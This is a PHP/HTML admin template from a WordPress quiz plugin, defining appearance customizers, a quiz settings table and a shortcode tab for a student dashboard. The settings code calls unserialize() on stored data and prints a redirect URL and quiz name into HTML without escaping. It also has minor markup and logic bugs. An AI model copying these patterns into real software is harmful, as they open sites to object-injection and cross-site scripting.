									  <span class="input-group-addon">
										  <i style="background-color:"></i>
									  </span>
								</div>
							</div>
						</div>
					</div>
				
					<div class="Template-Customize-element" style="display:none">
						<div class="Template-Customize-element-inner template_img_style" style="display: block;">
							<div class="inner_template_style_box"> <h4>Section background color</h4>	
								<div id="dm_section_engagement_temp_background_color_div" class="input-group colorpicker-component">
							  		<input type="text" value="" id="dm_section_engagement_temp_background_color" name="" class="colorpicker-element"> 
								  	<span class="input-group-addon">
									  	<i style="background-color:"></i>
								   	</span>
							  	</div>
							</div>
						</div>
					</div>
							
					<div class="Template-Customize-element">
						<div class="Template-Customize-element-inner template_img_style" style="display: block;">
							<div class="inner_template_style_box"> <h4>Background Color</h4>	
								<div id="dm_engagement_temp_left_side_background_color_div" class="input-group colorpicker-component colorpicker-element">
									<input type="text" name="dm_engagement_temp_left_side_background_color" value="<?php echo $dm_engagement_temp_left_side_background_color; ?>" id="dm_engagement_temp_left_side_background_color" class="colorpicker-element"> 
									<span class="input-group-addon">
										<i style="background-color: <?php echo $dm_engagement_temp_left_side_background_color; ?>;"></i>
									</span>
								</div>	
							</div>
						</div>
					</div>
				
					<div class="Template-Customize-element" style="display: none;">
						<div class="Template-Customize-element-inner template_img_style" style="display: block;">
							<div class="inner_template_style_box"> <h4>Left &amp; Right section divider Color</h4>	
								<div id="dm_engagement_temp_left_right_divider_color_div" class="input-group colorpicker-component">
									<input type="text" name="dm_engagement_temp_left_right_divider_color" value="" id="dm_engagement_temp_left_right_divider_color"> 
									<span class="input-group-addon">
										<i style="background-color:"></i>
									</span>
								</div>
							</div>
						</div>
					</div>
					
					<div class="Template-Customize-element-per-row-four">
						<div class="Template-Customize-element">
							<div class="Template-Customize-element-inner start_temp_width" style="display: block;">
								<div class="inner_template_style_box">
									<h4>Border Width</h4>
									<p>
										<input id="dm_engagement_temp_border_width" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="0" data-slider-max="20" data-slider-step="1" data-slider-value="<?php echo $dm_engagement_temp_border_width; ?>" />			
									</p>
								</div>
							</div>
						</div>
					
						<div class="Template-Customize-element">
							<div class="Template-Customize-element-inner start_temp_width" style="display: block;">
								<div class="inner_template_style_box">
									<h4>Border Style</h4>
									<p>
										<select id="dm_engagement_temp_border_style" name="dm_engagement_temp_border_style">
											<option value="none" <?php if($dm_engagement_temp_border_style == "none"){ echo "selected"; } ?>>None</option>
											<option value="solid <?php if($dm_engagement_temp_border_style == "solid"){ echo "selected"; } ?>">Solid</option>
											<option value="dashed" <?php if($dm_engagement_temp_border_style == "dashed"){ echo "selected"; } ?>>Dashed</option>
											<option value="dotted" <?php if($dm_engagement_temp_border_style == "dotted"){ echo "selected"; } ?>>Dotted</option>											
										</select>
									</p>
								</div>
						  	</div>
						</div>
					
						<div class="Template-Customize-element">
							<div class="Template-Customize-element-inner template_img_style" style="display: block;">
								<div class="inner_template_style_box"> <h4>Border Color</h4>	
									<div id="dm_engagement_temp_border_color_div" class="input-group colorpicker-component colorpicker-element">
										<input type="text" name="dm_engagement_temp_border_color" value="<?php echo $dm_engagement_temp_border_color; ?>" id="dm_engagement_temp_border_color" class="colorpicker-element"> 
										<span class="input-group-addon">
											<i style="background-color: <?php echo $dm_engagement_temp_border_color; ?>;"></i>
										</span>
									</div>
								</div>
							</div>
						</div>

						<div class="Template-Customize-element">
							<div class="Template-Customize-element-inner start_temp_width" style="display: block;">
								<div class="inner_template_style_box">
									<h4>Border Radius</h4>
									<p>
										<input id="dm_engagement_temp_border_radius" name="dm_engagement_temp_border_radius" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="20" data-slider-step="1" data-slider-value="<?php echo $dm_engagement_temp_border_radius; ?>"> 
									</p>
								</div>
							</div>
						</div>
					</div>
					
					<h2>Button Customizer</h2>
					<div class="Template-Customize-element Template-Customize-element-per-row-two">
						<div class="Template-Customize-element-inner template_img_style" style="display: block;">
							<div class="inner_template_style_box"> <h4>Completed Quiz Background color</h4>	
								<div id="completed_quiz_background_color_div" class="input-group colorpicker-component colorpicker-element">
									<input type="text" value="<?php echo $completed_quiz_background_color; ?>" id="completed_quiz_background_color" name="completed_quiz_background_color" class="colorpicker-element"> 
									<span class="input-group-addon">
										<i style="background-color: <?php echo $completed_quiz_background_color; ?>;"></i>
									</span>
								</div>
							</div>
						</div>
					</div>
					<div class="Template-Customize-element Template-Customize-element-per-row-two sqb-mt-5">
						<div class="Template-Customize-element-inner template_img_style" style="display: block;">
							<div class="inner_template_style_box"> <h4>Not Started Quiz Background color</h4>	
								<div id="not_started_background_div" class="input-group colorpicker-component colorpicker-element">
									<input type="text" value="<?php echo $not_started_background_color; ?>" id="not_started_background_color" name="not_started_background_color" class="colorpicker-element"> 
									<span class="input-group-addon">
										<i style="background-color: <?php echo $not_started_background_color; ?>;"></i>
									</span>
								</div>
							</div>
						</div>
					</div>

					<h2>External Shadow Customizer</h2>
					<div class="Template-Customize-element">
						<div class="Template-Customize-element-inner template_img_style" style="display: block;">
							<div class="inner_template_style_box"> <h4>Shadow Color</h4>	
								<div id="dm_engagement_temp_shadow_color_div" class="input-group colorpicker-component colorpicker-element">
									<input type="text" value="<?php echo $dm_engagement_temp_shadow_color; ?>" id="dm_engagement_temp_shadow_color" name="dm_engagement_temp_shadow_color" class="colorpicker-element"> 
									<span class="input-group-addon">
										<i style="background-color: <?php echo $dm_engagement_temp_shadow_color; ?>;"></i>
									</span>
								</div>
							</div>
						</div>
					</div>

					<div class="Template-Customize-element">
						<div class="Template-Customize-element-inner start_temp_width" style="display: block;">
							<div class="inner_template_style_box">
								<h4>Spread Radius</h4>
								<p>
									<input id="dm_engagement_temp_shadow_spread_radius" name="dm_engagement_temp_shadow_spread_radius" class="form-control" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="20" data-slider-step="1" data-slider-value="<?php echo $dm_engagement_temp_shadow_spread_radius; ?>"> 
								</p>
							</div>
						</div>
					</div>
					<div class="Template-Customize-element">
						<div class="Template-Customize-element-inner start_temp_width" style="display: block;">
							<div class="inner_template_style_box">
								<h4>Blur Radius</h4>
								<p>
									<input id="dm_engagement_temp_shadow_blur_radius" name="dm_engagement_temp_shadow_blur_radius" class="form-control" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="20" data-slider-step="1" data-slider-value="<?php echo $dm_engagement_temp_shadow_blur_radius; ?>"> 
								</p>
							</div>
						</div>
					</div>
					<div class="Template-Customize-element">
						<div class="Template-Customize-element-inner start_temp_width" style="display: block;">
							<div class="inner_template_style_box">
								<h4>Horizontal Length</h4>
								<p>
									<input id="dm_engagement_temp_shadow_horizontal_length" name="dm_engagement_temp_shadow_horizontal_length" class="form-control" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="20" data-slider-step="1" data-slider-value="<?php echo $dm_engagement_temp_shadow_horizontal_length; ?>"> 
								</p>
							</div>
						</div>
					</div>
					<div class="Template-Customize-element">
						<div class="Template-Customize-element-inner start_temp_width" style="display: block;">
							<div class="inner_template_style_box">
								<h4>Vertical Length</h4>
								<p>
									<input id="dm_engagement_temp_shadow_vertical_length" name="dm_engagement_temp_shadow_vertical_length" class="form-control" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="20" data-slider-step="1" data-slider-value="<?php echo $dm_engagement_temp_shadow_vertical_length; ?>"> 
								</p>
							</div>
						</div>
					</div>
				</div>
			</div>
	   </div>		 
	 	<div class="Template-Customize-Setting ">
			<div class="showHideLeftSidebaroptions">
				<h3 class="Template-Customize_heading"> 
					<div class="toll-tip-title-v2" style="">Image Customizer</div> 
					<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M436 192H312c-13.3 0-24-10.7-24-24V44c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v84h84c6.6 0 12 5.4 12 12v40c0 6.6-5.4 12-12 12zm-276-24V44c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v84H12c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h124c13.3 0 24-10.7 24-24zm0 300V344c0-13.3-10.7-24-24-24H12c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h84v84c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm192 0v-84h84c6.6 0 12-5.4 12-12v-40c0-6.6-5.4-12-12-12H312c-13.3 0-24 10.7-24 24v124c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12z"></path></svg>
					<div class="customize_open_close">   
						<i class="fa fa-angle-up customize_close" aria-hidden="true" style="display:none"></i>
						<i class="fa fa-angle-down customize_open" aria-hidden="true"></i>
					</div>
				</h3> 
			</div>
            <div class="customizer_innner_sections template-customizer-v2" style="display:none">
        		<div class="sqb_closed_ufp_customizer_opiton"><i class="fa fa-times"></i></div>
				<div class="customizer_innner_sections-inner">
					<h2>Image Customizer</h2>
					<div class="Template-Customize-element Template-Customize-element-per-row-two">
						<div class="Template-Customize-element-inner template_img_style" style="display: block;">
							<div class="inner_template_style_box"> <h4>Use image height (auto mode) <span class="showthistext-as-tooltips"><i class="fa fa-info-circle"></i><div class="toll-tip-desc-v2">This means... if it's 350 * 350, SQB will display it as is without cropping.</div></span></h4>	
								<div class="switch_onoff imagemode-customizer ml-auto">
									<input class="checkbox" type="checkbox" id="dm_engagement_completed_image_height_type" value="yes" name="dm_engagement_completed_image_height_type" <?php if($dm_engagement_completed_image_height_type == "Y"){ echo 'checked="checked"'; } ?>>
									<label for="dm_engagement_completed_image_height_type"></label>
								</div>						  
							</div>
						</div>
					</div>
					
					<div class="Template-Customize-element Template-Customize-element-per-row-two">
						<div class="Template-Customize-element-inner start_temp_img_width" style="<?php echo $dm_engagement_completed_image_height_type_show; ?>">
							<div class="inner_template_style_box">
								<h4>Use fixed height <span class="showthistext-as-tooltips tooltipleftside"><i class="fa fa-info-circle"></i><div class="toll-tip-desc-v2">Image height needs to be 180px</div></span></h4>
								<p>
									<input id="dm_engagement_completed_image_height" name="dm_engagement_completed_image_height" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="50" data-slider-max="500" data-slider-step="1" data-slider-value="<?php echo $dm_engagement_completed_image_height; ?>">
								</p>
							</div>
						</div>
					</div>
					<h2>Template Customizer</h2>
					<div class="Template-Customize-element Template-Customize-element-per-row-two">
						<div class="Template-Customize-element-inner start_temp_width" style="display: block;">
							<div class="inner_template_style_box">
								<h4>Width</h4>
								<div class="template-percentage-pixel-wrapper">
									<div class="tempate-slider-for-percentage" style="<?php if($template_percentage_selection == "px"){ echo "display: none"; } ?>">
										<input id="dm_engagement_completed_template_width" name="dm_engagement_completed_template_width" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="10" data-slider-max="100" data-slider-step=".01" data-slider-value="<?php echo $dm_engagement_completed_template_width; ?>">
									</div>
									<div class="tempate-slider-for-pixel" style="<?php if($template_percentage_selection == "percentage"){ echo "display: none"; } ?>">
										<input id="dm_engagement_completed_template_width_in_px" name="dm_engagement_completed_template_width_in_px" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="10" data-slider-max="500" data-slider-step="1" data-slider-value="<?php echo $dm_engagement_completed_template_width; ?>">
									</div>
									<div class="tempate-slider-for-px-percentage">
										<input type="number" name="percentagepixel-input" value="<?php echo $dm_engagement_completed_template_width_val; ?>">
										<select id="template-percentage-selection" name="template-percentage">
											<option value="percentage" <?php if($template_percentage_selection == "percentage"){ echo "selected"; } ?>>%</option>
											<option value="px" <?php if($template_percentage_selection == "px"){ echo "selected"; } ?>>PX</option>
										</select>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
	   </div>

	   <div class="Template-Customize-Setting ">
			<div class="showHideLeftSidebaroptions">
				<h3 class="Template-Customize_heading"> 
					<div class="toll-tip-title-v2" style="">Certificate Customizer</div> 
					<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path d="M173.8 5.5c11-7.3 25.4-7.3 36.4 0L228 17.2c6 3.9 13 5.8 20.1 5.4l21.3-1.3c13.2-.8 25.6 6.4 31.5 18.2l9.6 19.1c3.2 6.4 8.4 11.5 14.7 14.7L344.5 83c11.8 5.9 19 18.3 18.2 31.5l-1.3 21.3c-.4 7.1 1.5 14.2 5.4 20.1l11.8 17.8c7.3 11 7.3 25.4 0 36.4L366.8 228c-3.9 6-5.8 13-5.4 20.1l1.3 21.3c.8 13.2-6.4 25.6-18.2 31.5l-19.1 9.6c-6.4 3.2-11.5 8.4-14.7 14.7L301 344.5c-5.9 11.8-18.3 19-31.5 18.2l-21.3-1.3c-7.1-.4-14.2 1.5-20.1 5.4l-17.8 11.8c-11 7.3-25.4 7.3-36.4 0L156 366.8c-6-3.9-13-5.8-20.1-5.4l-21.3 1.3c-13.2 .8-25.6-6.4-31.5-18.2l-9.6-19.1c-3.2-6.4-8.4-11.5-14.7-14.7L39.5 301c-11.8-5.9-19-18.3-18.2-31.5l1.3-21.3c.4-7.1-1.5-14.2-5.4-20.1L5.5 210.2c-7.3-11-7.3-25.4 0-36.4L17.2 156c3.9-6 5.8-13 5.4-20.1l-1.3-21.3c-.8-13.2 6.4-25.6 18.2-31.5l19.1-9.6C65 70.2 70.2 65 73.4 58.6L83 39.5c5.9-11.8 18.3-19 31.5-18.2l21.3 1.3c7.1 .4 14.2-1.5 20.1-5.4L173.8 5.5zM272 192c0-44.2-35.8-80-80-80s-80 35.8-80 80s35.8 80 80 80s80-35.8 80-80zM1.3 441.8L44.4 339.3c.2 .1 .3 .2 .4 .4l9.6 19.1c11.7 23.2 36 37.3 62 35.8l21.3-1.3c.2 0 .5 0 .7 .2l17.8 11.8c5.1 3.3 10.5 5.9 16.1 7.7l-37.6 89.3c-2.3 5.5-7.4 9.2-13.3 9.7s-11.6-2.2-14.8-7.2L74.4 455.5l-56.1 8.3c-5.7 .8-11.4-1.5-15-6s-4.3-10.7-2.1-16zm248 60.4L211.7 413c5.6-1.8 11-4.3 16.1-7.7l17.8-11.8c.2-.1 .4-.2 .7-.2l21.3 1.3c26 1.5 50.3-12.6 62-35.8l9.6-19.1c.1-.2 .2-.3 .4-.4l43.2 102.5c2.2 5.3 1.4 11.4-2.1 16s-9.3 6.9-15 6l-56.1-8.3-32.2 49.2c-3.2 5-8.9 7.7-14.8 7.2s-11-4.3-13.3-9.7z"/></svg>
					<div class="customize_open_close">   
						<i class="fa fa-angle-up customize_close" aria-hidden="true" style="display:none"></i>
						<i class="fa fa-angle-down customize_open" aria-hidden="true"></i>
					</div>
				</h3> 
			</div>
            <div class="customizer_innner_sections template-customizer-v2" style="display:none">
        		<div class="sqb_closed_ufp_customizer_opiton"><i class="fa fa-times"></i></div>
				<div class="customizer_innner_sections-inner">
					<h2>Certificate Customizer</h2>
					<div class="Template-Customize-element Template-Customize-element-per-row-two">
						<div class="Template-Customize-element-inner template_img_style" style="display: block;">
							<div class="inner_template_style_box"> <h4>Enable Certificate</h4>	
								<div class="switch_onoff imagemode-customizer ml-auto">
									<input class="checkbox" type="checkbox" id="dm_engagement_enable_certificate" value="yes" name="dm_engagement_enable_certificate" <?php if($dm_engagement_enable_certificate == "Y"){ echo 'checked="checked"'; } ?>>
									<label for="dm_engagement_enable_certificate"></label>
								</div>						  
							</div>
						</div>
					</div>
				</div>
			</div>
	   </div>

	   <div class="Template-Customize-Setting ">
			<div class="showHideLeftSidebaroptions">
				<h3 class="Template-Customize_heading"> 
					<div class="toll-tip-title-v2" style="">Retake Settings</div> 
					<svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24"> <path d="M12 5V1L8 5l4 4V6c3.3 0 6 2.7 6 6a6 6 0 0 1-6 6 6 6 0 0 1-5.9-5H4a8 8 0 1 0 8-8z"/> </svg>
					<div class="customize_open_close">   
						<i class="fa fa-angle-up customize_close" aria-hidden="true" style="display:none"></i>
						<i class="fa fa-angle-down customize_open" aria-hidden="true"></i>
					</div>
				</h3> 
			</div>
            <div class="customizer_innner_sections template-customizer-v2" style="display:none">
        		<div class="sqb_closed_ufp_customizer_opiton"><i class="fa fa-times"></i></div>
				<div class="customizer_innner_sections-inner">
					<h2>Retake Quiz Settings</h2>
					<div class="Template-Customize-element-inner template_img_style" style="display: block;">
						<div class="inner_template_style_box"> <h4>Enable Retake</h4><small>Displayed only if quiz retake is allowed for users.</small>	
							<div class="switch_onoff imagemode-customizer ml-auto">
								<input class="checkbox" type="checkbox" id="dm_engagement_enable_retake" value="yes" name="dm_engagement_enable_retake" <?php if($dm_engagement_enable_retake == "Y"){ echo 'checked="checked"'; } ?>>
								<label for="dm_engagement_enable_retake"></label>
							</div>						  
						</div>
					</div>
				</div>
			</div>
	   </div>

	    <div class="Template-Customize-Setting " style="display:none">
			<div class="showHideLeftSidebaroptions">
				<h3 class="Template-Customize_heading"> 
					<div class="toll-tip-title-v2" style="">Product Box Customizer</div> 
					<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M400 32H48C21.5 32 0 53.5 0 80v352c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48z"></path></svg>
					<div class="customize_open_close">   
						<i class="fa fa-angle-up customize_close" aria-hidden="true" style="display:none"></i>
						<i class="fa fa-angle-down customize_open" aria-hidden="true"></i>
					</div>
				</h3> 
			</div>
        	<div class="customizer_innner_sections" style="display:none">
        		<div class="sqb_closed_ufp_customizer_opiton"><i class="fa fa-times"></i></div>
        		<div class="customizer_innner_sections-inner">
					<div class="Template-Customize-element">
						<div class="Template-Customize-element-inner start_temp_width" style="display: block;">
							<div class="inner_template_style_box">
								<h4>Box Width</h4>
								<p>
									<input id="dm_engagement_pro_box_width" name="dm_engagement_pro_box_width" class="form-control" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="800" data-slider-step="1" data-slider-value="" style="display: none;" data-value="400" value="400"> 
								</p>
							</div>
						</div>
					</div>
						
					<div class="Template-Customize-element">
						<div class="Template-Customize-element-inner start_temp_width" style="display: block;">
							<div class="inner_template_style_box">
								<h4>Box height</h4>
								<p>
									<input id="dm_engagement_pro_box_height" name="dm_engagement_pro_box_height" class="form-control" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="500" data-slider-step="1" data-slider-value="" style="display: none;" data-value="80" value="80"> 
								</p>
							</div>
						</div>
					</div>
							
					<div class="Template-Customize-element">
						<div class="Template-Customize-element-inner start_temp_width" style="display: block;">
							<div class="inner_template_style_box">
								<h4>Box Image Width</h4>
								<p>
									<input id="dm_engagement_pro_box_img_width" name="dm_engagement_pro_box_img_width" class="form-control" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="500" data-slider-step="1" data-slider-value="" style="display: none;" data-value="70" value="70"> 
								</p>
							</div>
						</div>
				
					</div>
				
					<div class="Template-Customize-element">
						<div class="Template-Customize-element-inner start_temp_width" style="display: block;">
							<div class="inner_template_style_box">
								<h4>Box Image height</h4>
								<p>
									<input id="dm_engagement_pro_box_img_height" name="dm_engagement_pro_box_img_height" class="form-control" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="500" data-slider-step="1" data-slider-value="" style="display: none;" data-value="70" value="70"> 
								</p>
							</div>
						</div>
					</div>
				</div>
			</div>
	   	</div>
  	</div>
</div>

<div class="sqb_member_engagement-inner  sqb_member_engagement_full_width_temp">
	<div class="sqb_member_engagement-left sqb_member_drap_drop_parent_class ui-sortable">
		<div class="sqb_m_engagement-card sqb_m_engagement-inner-item sqb_member_template_drag_drop_item sqb_member_temp_quiz_completed_section ui-sortable-handle">
			<div class="completed-quiz-title sqb_m_title_outer  quiz-section-heading-wrapper">
				<?php echo $completed_title; ?>
			</div>
			<div class="completed-quizs-list sqb-quiz-listing dme_backend_show verticle_temp quiz-per-row-3" id="quiz_completed_section">
				<div class="completed-quiz-block first_sectio sqb-quiz-listing-single">
					<?php echo $completed_html ?>
				</div>
			</div>
			<div class="completed-quizs-list dme_backend_hide %%QUIZCOMPLETEDSQBENGAGEMENTTEMP%%">%%QUIZ_COMPLETED%%</div>
		</div>

		<div class="sqb_m_engagement-card sqb_m_engagement-inner-item sqb_member_template_drag_drop_item sqb_member_temp_quiz_not_started_section ui-sortable-handle">
			<div class="not-started-title sqb_m_title_outer  quiz-section-heading-wrapper">
				<?php echo $notstarted_title; ?>
			</div>
			<div class="completed-quizs-list sqb-quiz-listing dme_backend_show verticle_temp quiz-per-row-3" id="quiz_completed_section">
				<div class="not-started-quiz-block first_sectio sqb-quiz-listing-single">
					<?php echo $not_started_html; ?>
				</div>
			</div>
			<div class="completed-quizs-list dme_backend_hide %%QUIZCOMPLETEDSQBENGAGEMENTTEMP%%">%%QUIZ_COMPLETED%%</div>
		</div>
	</div>
</div>
<div class="quiz-actions student-save-data">
	<a href="javascript:void(0)" class="quiz--btn quiz-save-btn" onclick="sqb_save_member_data()"> Save </a>
	<a href="javascript:void(0)" class="quiz--btn quiz-save-next-btn" onclick="sqb_save_member_data('next')"> Save & Next </a>
</div>
</div>
<div class="tab-pane fade" id="settings_page_setup_tab" role="tabpanel" aria-labelledby="settings_page_setup_tab">
	<h3 class="  quiz--title quiz_settings_head pb-0"><i class="fa fa-exchange" aria-hidden="true"></i><div class="smalltext_outer">Settings</div> </h3>



<div class="sqb_member_engagement-inner  sqb_member_engagement_full_width_temp">
	<small style="width: 560px; font-size: 16px; padding: 10px 10px 10px 10px; height: auto; line-height: normal; float: none; text-align: left; border: 1px solid #ddd; font-weight: 500; border-radius: 4px; border-left: 3px solid #856404 !important; margin: 12px 0 20px; display: block; vertical-align: middle; color: #856404; background-color: #fff3cd; border-color: #ffeeba;"><span style="color:#f65a5a;">Please Note:</span> This is ONLY for in-page quizzes and button popup quiz</small>
	<table class="sqb-table-list-wrapper">
	  <thead>
	    <tr>
	      <th class="text-left">Quiz Name</th>
	      <th class="text-left" style="width: 230px;">Quiz Image</th>
	      <th class="text-left">Quiz URL (where it's published)</th>
	    </tr>
	  </thead>
		<tbody class="tbl-accordion-header quiz-global-settings">
	    

		<?php 


			if(!empty($completed_quiz_array || !empty($not_taken_quiz_array))){
				$all_array_data = array_unique(array_merge($completed_quiz_array, $not_taken_quiz_array));
				if(is_array($all_array_data) && count($all_array_data)){
					foreach($all_array_data as $array_data){
						$std_quiz = SQB_Quiz::loadById($array_data);
						if($std_quiz->getQuizDisplay() == "inpage" || $std_quiz->getQuizDisplay() == "popup"){
							$student_home_settings_redirecturl = "";
							$global_image = "";
							$quiz_id = $std_quiz->getId();
							$student_image_and_redirect_url = SQB_GlobalTheme::loadByQuizIdAndName($quiz_id, "student_image_and_redirect_url");
							if(isset($student_image_and_redirect_url)){
								$redirect_url_unserialize = unserialize($student_image_and_redirect_url->getValue());
								$redirect_url = $redirect_url_unserialize['redirect_url'];
								$global_image = $redirect_url_unserialize['image'];
								if($redirect_url){
									$student_home_settings_redirecturl = $redirect_url;
								}
							}

							$table_data = '<tr data-quiz-id="'.$std_quiz->getId().'">
							      <td class="text-left quiz-name-field">
							        <a><strong>'.stripslashes($std_quiz->getQuizName()).' (ID: '.$std_quiz->getId().')</strong></a>
							      </td>
							      <td class="image-upload-on-member-profile-page text-left">';

								$questionTempData = SQB_QuizTemplate::loadByQuizId($std_quiz->getId());
							 	if($questionTempData != false){
								 	$addicon = $questionTempData->getStartImage();
							 	}else{
							 		$addicon = "";
							 	}

								if(isset($global_image) && !empty($global_image)){
									$student_image = $global_image;
								}else if(!empty($addicon)){
									$student_image = $questionTempData->getStartImage();
								}else{
									$student_image = "";
								}

								if(!empty($student_image)){
									$table_data .= '<a href="#" class="sqb-upload"><img src="'.esc_url( $student_image ).'" /></a>
													<a href="#" class="sqb-remove">Remove</a>
													<input type="hidden" name="sqb_img" value="">';
								}else{
									$table_data .= '<span class="no-image">No image found</span>
													<a href="#" class="button sqb-upload">Upload</a>
													<a href="#" class="sqb-remove" style="display:none">Remove</a>
													<input type="hidden" name="sqb_img" value="">';
								}
							      	$table_data .= '</td><td class="text-text-left"><input type="text" name="quiz_page_url" placeholder="Enter Quiz URL" value="'.$student_home_settings_redirecturl.'"></td></tr>';

			 					echo $table_data;
						}	
					}
				}	
			}
			 ?>
	  </tbody>
	</table>
</div>
<div class="quiz-actions student-save-data">
	<a href="javascript:void(0)" class="quiz--btn quiz-save-btn" onclick="sqb_save_member_data()"> Save </a>
	<a href="javascript:void(0)" class="quiz--btn quiz-save-next-btn" onclick="sqb_save_member_data('next')"> Save & Next </a>
</div>
</div>	
<div class="tab-pane fade" id="student_shortcode_tab" role="tabpanel" aria-labelledby="student_shortcode_tab">
	<div class="student_shortocde_details">
		<p><span><b>Name:</b> <span class="sqb_detail_quiz_name"><?php echo $member_name; ?></span></span></p>
		<div class="mb-0 students-shortcode-wrapper"><span><b>Shortcode:</b> <span class="sqb_detail_quiz_type"><div class="shortcode_table_td" bis_skin_checked="1"> <span id="eng_dynamic_copyable_text_1" class="student_shortcode_id"><?php echo $student_shortcode; ?></span><span data-id="eng_dynamic_copyable_text_1" id="copy_shortcode" class="copy-btn theme-button btn btn-info " onclick="sqb_member_copy_to_clipboard(this)">Copy</span></div></span></span></div>
		<p>You can enter this shortcode on any WordPress page</p>
	</div>
	<div class="dap-member-notes-wrapper alert alert-warning">
		<p><span>Please note: Only logged-in members will see this page. Not logged-in members will be see a "you are not logged-in message". </span></p>
		<p><span>This message can be customized in SQB >> <a href="../wp-admin/admin.php?page=sqb_settings&tab=message_customizer">Settings page.</a></span></p>
	</div>
	<div class="quiz-actions student-save-data">
		<a href="<?php echo admin_url('admin.php?page=sqb_student_home'); ?>" class="quiz--btn quiz-save-btn return-student-home"> Return to Student Dashboard </a>
	</div>
</div>	
